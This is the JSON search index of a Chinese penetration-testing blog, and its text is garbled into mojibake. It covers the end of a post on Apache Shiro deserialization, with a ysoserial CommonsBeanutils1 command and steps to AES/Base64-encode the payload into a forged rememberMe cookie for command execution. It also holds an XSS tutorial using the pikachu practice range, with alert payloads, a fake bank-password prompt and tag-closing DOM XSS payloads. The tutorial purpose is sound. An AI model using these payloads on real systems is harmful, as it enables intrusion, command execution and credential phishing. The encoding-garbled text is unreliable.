åˆ©ç”¨ysoserialç”Ÿæˆ.seræ–‡ä»¶ java -jarysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 â€œå‘½ä»¤â€ &gt; x.ser ç„¶åè¿›è¡ŒAESåŠ å¯†ã€Base64åŠ å¯†ï¼Œä¼ªé€ cookieï¼Œæ‰§è¡Œå‘½ä»¤ å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦ä½¿ç”¨äº†shiroæ¡†æ¶åœ¨è¯·æ±‚åŒ…ä¸­çš„cookieå­—æ®µæ·»åŠ rememberMe=xxx,æŸ¥çœ‹å“åº”å¤´ä¸­æ˜¯å¦åŒ…å«rememberMe=deleteMeå€¼ä¾‹å¦‚ï¼š","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"webæ¼æ´/ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"shiroååºåˆ—åŒ–","slug":"shiroååºåˆ—åŒ–","permalink":"https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"author":"redfish"},{"title":"XSSåŸºç¡€(ä¸€)","slug":"XSSåŸºç¡€-ä¸€","date":"2021-06-15T02:33:00.000Z","updated":"2021-12-06T03:11:09.337Z","comments":true,"path":"2021/06/15/XSSåŸºç¡€-ä¸€/","link":"","permalink":"https://redredredfish.github.io/2021/06/15/XSS%E5%9F%BA%E7%A1%80-%E4%B8%80/","excerpt":"","text":"åŸç†ä»€ä¹ˆæ˜¯XSSå…¶å®æˆ‘ä¸€ç›´ä¸å¤ªç†è§£ä¸ºå•¥åå°„å‹XSSåœ¨æŠ¥å‘Šé‡Œå¸¸å¹´ä½œä¸ºé«˜å±æ¼æ´ï¼Œè™½ç„¶è¯´æ¸—é€å­¦ä¹ çš„ç»ˆç‚¹æ˜¯é’“é±¼ï¼Œä½†æ˜¯å®é™…å·¥ä½œä¸­é‡åˆ°çœŸæ­£èƒ½åˆ©ç”¨çš„å…¶å®å¹¶ä¸å¤šï¼Œè€Œä¸”è¿™ç©æ„æœ‰æ—¶å€™å‚æ•°å¤šä¿®èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œå¿ƒç–¼ç”²æ–¹å¼€å‘ä¸‰ç§’ã€‚ ä¸ç®¡äº†å…ˆçœ‹çœ‹ç™¾åº¦æ˜¯å’‹è§£é‡Šçš„ï¼š XSSæ”»å‡»é€šå¸¸æŒ‡çš„æ˜¯é€šè¿‡åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œé€šè¿‡å·§å¦™çš„æ–¹æ³•æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åºã€‚è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯JavaScriptï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥åŒ…æ‹¬Javaã€ VBScriptã€ActiveXã€ Flashæˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„HTMLã€‚æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°åŒ…æ‹¬ä½†ä¸é™äºæ›´é«˜çš„æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹ã€‚ è¯´çš„ç®€å•ç‚¹ï¼Œè·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„ä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆæ—¶ï¼Œä»£ç ä¼šè¢«æ‰§è¡Œï¼Œæœ€ç®€å•çš„å¼¹å¼¹çª—ææå¿ƒæ€é’“é’“é±¼å•¥çš„ï¼Œå½“ç„¶ä¸æ­¢xssçš„åˆ©ç”¨ä¸æ­¢äºæ­¤ã€‚æ‰€ä»¥é€ æˆxssçš„å…³é”®æ˜¯ç”¨æˆ·çš„è¾“å…¥æœªè¿‡æ»¤ç›´æ¥è¾“å‡ºã€‚ ç±»å‹ XSSçš„ç±»å‹å¸¸è§çš„æ€»å…±æœ‰ä¸‰ç§ï¼Œåå°„å‹ã€å­˜å‚¨å‹ã€DOMå‹ åå°„å‹XSS åå°„å‹XSSæ˜¯æœ€å¸¸è§ä¹Ÿæ˜¯æœ€å®¹æ˜“éªŒè¯çš„ç±»å‹ï¼Œå’Œå­˜å‚¨å‹çš„åŒºåˆ«æ˜¯æ¶æ„ä»£ç ä¸å­˜å‚¨åœ¨æœåŠ¡ç«¯åªåšäº¤äº’ï¼Œæ’å…¥ä»€ä¹ˆå°±è¾“å‡ºä»€ä¹ˆï¼Œæ ¹æ®ä¿ºçš„ç»éªŒï¼Œä¸€èˆ¬åœ¨æ— å®³åŒ–æ¼æ´æ‰«æå™¨ä¸­æ‰«å‡ºçš„XSSéƒ½æ˜¯åå°„å‹XSSæ¼æ´ ã€‚å…³äºå¦‚ä½•äº¤äº’å¯ä»¥çœ‹ä¸‹é¢è¿™å¼ å›¾ã€‚ é€ æˆæ­¤ç±»æ¼æ´çš„å¼±ç‚¹å‚æ•°æ™®éå­˜åœ¨äºURLä¸­ï¼Œåœ¨æµ‹è¯•ä¸­å¯ä»¥é‡ç‚¹å…³æ³¨æŸäº›å¯ä»¥äººä¸ºæ§åˆ¶çš„å‚æ•°ï¼Œç‰¹åˆ«æ˜¯ä¼šåæ˜ åœ¨å‰ç«¯çš„å‚æ•°ã€‚ åå°„å‹æœ€ç®€å•çš„payloadå°±æ˜¯å¼¹çª—éªŒè¯ï¼Œå³&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;,&lt;script&gt; æ ‡ç­¾ç”¨äºåœ¨å‰ç«¯æ’å…¥JSä»£ç ï¼Œalert()å‡½æ•°ç”¨äºæ˜¾ç¤ºå¸¦å†…å®¹çš„å¼¹çª—ã€‚ å…³äºgetåå°„å’Œpoståå°„ï¼Œç®€å•ç†è§£å°±æ˜¯getå‹å‚æ•°æ˜¯ä½ èƒ½åœ¨urlé‡Œæ‰¾åˆ°çš„ï¼Œpostä¸€èˆ¬åœ¨æµé‡åŒ…é‡Œurlé‡Œæ˜¯çœ‹ä¸è§çš„ï¼Œè¿™ç©æ„æ·±å…¥ä¸‹å»å°±è¦æ¶‰åŠåˆ°TCP/IPé‚£ä¸€å¥—äº†ï¼Œæˆ‘è¿™ç§æœ€ä½çº§çš„å®‰æœä»”è‚¯å®šä¸ä¼šï¼Œå¯ä»¥çœ‹çœ‹è¿™ä½å¤§ä½¬çš„è§£é‡Šã€‚ ä¸‹é¢æ‹¿pikachué¶åœºä¸¾ä¾‹ï¼š è°æ˜¯ä½ æœ€å–œæ¬¢çš„NBAçƒå‘˜ï¼Œå½“ç„¶æ˜¯åº“é‡Œå•¦çš„(ï¿£ï¸¶ï¿£*))è¯•ä¸€ä¸‹payloadï¼š 123&lt;script type=&quot;text/javascript&quot;&gt;var code = prompt(&quot;è¯·è¾“å…¥ä½ çš„é“¶è¡Œå¡å¯†ç ï¼š&quot;);&lt;/script&gt; å¯ä»¥çœ‹åˆ°å¼¹çª—äº†ï¼Œé‡ç‚¹å…³æ³¨è¿™ä¸ªURLï¼Œå¯è§æˆ‘ä»¬è¾“å…¥çš„å‚æ•°è¢«URLç¼–ç åå¸¦åœ¨é‡Œé¢ï¼Œè¯•æƒ³å¦‚æœæœ‰äººæ‹¿è¿™ä¸ªä½çº§é“¾æ¥æ¥ğŸ£ï¼Œæ²¡æœ‰å®‰å…¨å¸¸è¯†çš„ç”²æ–¹çˆ¸çˆ¸ç¡®å®æœ‰å¯èƒ½ä¼šä¸Šé’©ï¼Œè¿™æ—¶å€™å±å®³æ€§å°±ä½“ç°å‡ºæ¥äº†ã€‚ å­˜å‚¨å‹XSS é¦–å…ˆæä¸€ä¸‹ï¼Œå½“ä½ æ€€ç–‘æœ‰å­˜å‚¨å‹XSSçš„æ—¶å€™åƒä¸‡è¦å…ˆåœ¨burpsuiteé‡Œé‡æ”¾è¯•è¯•ï¼Œä¹‹å‰æœ‰ä¸€æ¬¡æ¸—é€ï¼Œåœ¨å®¢æˆ·çš„OAé‡Œå‘ç°äº†ä¸€ä¸ªå­˜å‚¨å‹XSSï¼Œæ‰‹è´±å­˜äº†ä¸ªå¼¹çª—ä»£ç ï¼Œå¯¼è‡´æ•´ä¸ªå‰ç«¯æ ¼å¼å´©æºƒæµè§ˆå™¨æ— æ³•æ¸²æŸ“ï¼Œæœ€ååœ¨æœåŠ¡å™¨æ•°æ®åº“é‡Œæ‘¸äº†åŠå¤©æ‰æ‰¾åˆ°ï¼Œå¥½ç«¯ç«¯çš„æ¸—é€å¹²æˆåº”æ€¥äº†ï¼Œè¡€æ·‹æ·‹çš„æ•™è®­ğŸ˜­ ç”±ä¸Šè¿°ä½çº§äº‹æ•…å¯çŸ¥å­˜å‚¨å‹XSSå®é™…çš„å±å®³è¿˜æ˜¯è›®å¤§çš„ï¼Œé¡¾åæ€ä¹‰å­˜å‚¨å‹XSSå°±æ˜¯å°†æ¶æ„ä»£ç å­˜åœ¨æœåŠ¡ç«¯æˆ–è€…æ•°æ®åº“ï¼Œä¸€èˆ¬è¿™ç§æ¼æ´åœ¨ç•™è¨€ã€æ·»åŠ æ•°æ®è¿™ç§åŠŸèƒ½ç‚¹å‡ºç°çš„æ¯”è¾ƒå¤šï¼Œå½“ç”¨æˆ·å»è®¿é—®è¢«å­˜å…¥æ¶æ„ä»£ç çš„é¡µé¢æ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šæ‰§è¡Œã€‚ è¿˜æ˜¯æ‹¿pikachuæ¥ä¸¾ä¾‹ï¼š è¿˜æ˜¯ä¸€æ ·åœ¨ç•™è¨€åŠŸèƒ½ç‚¹å­˜ä¸€ä¸ªå¼¹çª—payloadè¿›å»ã€‚ å¯ä»¥çœ‹åˆ°æ¯æ¬¡è¿›è¿™ä¸ªé¡µé¢éƒ½ä¼šå¼¹çª—ã€‚ åŸå› æ˜¯æˆ‘ä»¬å†™å…¥çš„æ¶æ„ä»£ç å·²ç»è¢«å­˜åˆ°äº†åå°ï¼Œå½“æˆ‘ä»¬æ¯æ¬¡æ‰“å¼€é¡µé¢ï¼Œå±•ç¤ºç•™è¨€åŠŸèƒ½å°±ä¼šä»åå°æ•°æ®åº“é‡Œè¯»å–åˆ°è¿™æ®µæ¶æ„ä»£ç å¹¶äº¤ç»™æµè§ˆå™¨æ¸²æŸ“è¾“å‡ºã€‚ ç¡®å®æŒºæäººå¿ƒæ€çš„çš„â”—|ï½€Oâ€²|â”› ã€‚ DOMå‹XSS æ„Ÿè§‰DOMå‹åŸºæœ¬æ²¡é‡åˆ°è¿‡ï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†æ²¡æ³¨æ„è¿‡ã€‚ é¦–å…ˆå•¥æ˜¯DOM?å…¶å®å°±æ˜¯çº¯å‰ç«¯çš„å‚æ•°æ¥å£ï¼Œæœ‰äº†è¿™ä¸ªå¯ä»¥æ§åˆ¶å‰ç«¯å‚æ•°åšåŠ¨æ€ç½‘é¡µä½†ä¸å’Œåç«¯åšæ•°æ®äº¤äº’ã€‚ æ‰€ä»¥DOMå‹XSSå®é™…ä¸Šæ˜¯ç”±äºå‰ç«¯çš„å‚æ•°äººä¸ºå¯æ§é€ æˆçš„ çœ‹çœ‹pikachuä¸­çš„DOMå‹XSS:æäº¤åŠŸèƒ½ç‚¹çš„JSä»£ç æ˜¯è¿™æ ·å†™çš„ã€‚å¤§æ¦‚å°±æ˜¯è¾“å…¥ä¸€ä¸ªç½‘å€ï¼Œç„¶åç‚¹ä¸€ä¸‹what do you see?è¿™å¥è¯å°±èƒ½è·³è½¬è¿‡å»ã€‚æ˜¾ç„¶è¿™ä¸ªstrå‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå› ä¸ºåœ¨å‰ç«¯å¤„ç†æ•°æ®ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•è®©å®ƒå˜æˆæ¶æ„ä»£ç ï¼Œåæ­£æµè§ˆå™¨åªç®¡æ¸²æŸ“ä¸ä¼šç®¡è¯­å¥æ˜¯ä¸æ˜¯æ¶æ„ã€‚çœ‹ä¸€ä¸‹pikachuæä¾›çš„ä¸¤ä¸ªpayloadï¼š 12//è¯•è¯•ï¼š&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;//è¯•è¯•ï¼š&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,é—­åˆæ‰å°±è¡Œ ç¬¬ä¸€ä¸ª,&lt;img&gt;æ ‡ç­¾ä»£è¡¨å›¾ç‰‡ï¼Œonmouseoverä»£è¡¨é¼ æ ‡æ»‘è¿‡äº‹ä»¶ï¼Œæ‰€ä»¥å°±æ˜¯é¼ æ ‡æ»‘è¿‡è¿™å¼ å›¾ç‰‡å°±æ‰§è¡Œalert(&#39;xss&#39;)å¼¹ä¸ªçª—ç¬¬äºŒä¸ªå·®ä¸å¤šï¼Œonclickä»£è¡¨é¼ æ ‡ç‚¹å‡»äº‹ä»¶ä¸ºå•¥å®ƒè¯´é—­åˆæ‰å°±è¡Œï¼Ÿ å¯ä»¥æŠŠpayloadå¸¦è¿›é‚£å¥ä»£ç çœ‹çœ‹ï¼š 1&quot;&lt;a href=&#x27;&quot;+&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;+&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;; è¿™æ ·ä¸€çœ‹&quot;&lt;a href=&#39; &quot;+&#39;&gt;è¿™æ®µå®é™…ä¸Š&quot;+è¢«å½“ä½œäº†&lt;a&gt;æ ‡ç­¾çš„é“¾æ¥å‚æ•°ï¼Œæ˜¾ç„¶è¿™ä¸ªæ ‡ç­¾å°±æ²¡ç”¨äº†åé¢&quot; &#39;&gt;what do you see?&lt;/a&gt;&quot;å°±æ˜¯ä¸ªå­—ç¬¦ä¸²æ‰€ä»¥ç•™ä¸‹çš„æœ‰ç”¨çš„å°±åªæœ‰&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;ï¼Œè¿™æ ·æ”¹ä¸€æ”¹å°±åˆèƒ½æ‹¿æ¥ğŸ£äº†ã€‚ åœ¨å¤æ‚çš„ç½‘é¡µç¯å¢ƒä¸­ï¼Œä¼šå¤§é‡ç”¨åˆ°è¿™ç§é—­åˆæŠ€å·§ï¼Œéœ€è¦ç»“åˆF12æˆ–çŒœæ ‡ç­¾çš„å½¢å¼æ¥æ„é€ payloadã€‚ æ€»ç»“ åå°„å‹å’Œå­˜å‚¨å‹éƒ½ä¼šå’ŒæœåŠ¡ç«¯äº¤äº’ï¼ŒDOMå‹åˆ™æ˜¯çº¯å‰ç«¯ã€‚ åå°„å‹ä¸ä¼šå­˜åœ¨æœåŠ¡ç«¯æˆ–è€…æ•°æ®åº“ï¼ŒæœåŠ¡ç«¯åªä¼šæŠŠæ”¶åˆ°çš„URLåŸå°ä¸åŠ¨è¿˜ç»™æµè§ˆå™¨æ¸²æŸ“ã€‚ åˆ¤æ–­æ˜¯å­˜å‚¨å‹è¿˜æ˜¯åå°„å‹ï¼Œåªè¦çœ‹æäº¤ä¸€æ¬¡å¼¹çª—payloadå†åˆ·æ–°é¡µé¢ï¼Œä¸å¼¹å°±æ˜¯åå°„å‹ï¼Œè¿˜å¼¹å°±æ˜¯å­˜å‚¨å‹ã€‚ åˆ¤æ–­æ˜¯åå°„å‹è¿˜æ˜¯DOMå‹ï¼Œåªè¦åœ¨F12é‡Œæ‰¾æœ‰æ²¡æœ‰å¤„ç†å‚æ•°çš„ä»£ç ï¼Œæ²¡æœ‰å°±æ˜¯åå°„å‹ï¼Œæœ‰å°±æ˜¯DOMå‹ã€‚","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"XSS","slug":"webæ¼æ´/XSS","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/XSS/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://redredredfish.github.io/tags/XSS/"}],"author":"redfish"}],"categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"webæ¼æ´/ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"æœªæˆæƒè®¿é—®æ¼æ´","slug":"webæ¼æ´/æœªæˆæƒè®¿é—®æ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"name":"sqlæ³¨å…¥","slug":"webæ¼æ´/sqlæ³¨å…¥","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"XSS","slug":"webæ¼æ´/XSS","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/XSS/"}],"tags":[{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogicååºåˆ—åŒ–","slug":"weblogicååºåˆ—åŒ–","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"redisæœªæˆæƒè®¿é—®","slug":"redisæœªæˆæƒè®¿é—®","permalink":"https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"æœªæˆæƒè®¿é—®æ¼æ´","slug":"æœªæˆæƒè®¿é—®æ¼æ´","permalink":"https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql","slug":"mysql","permalink":"https://redredredfish.github.io/tags/mysql/"},{"name":"shiroååºåˆ—åŒ–","slug":"shiroååºåˆ—åŒ–","permalink":"https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"XSS","slug":"XSS","permalink":"https://redredredfish.github.io/tags/XSS/"}]}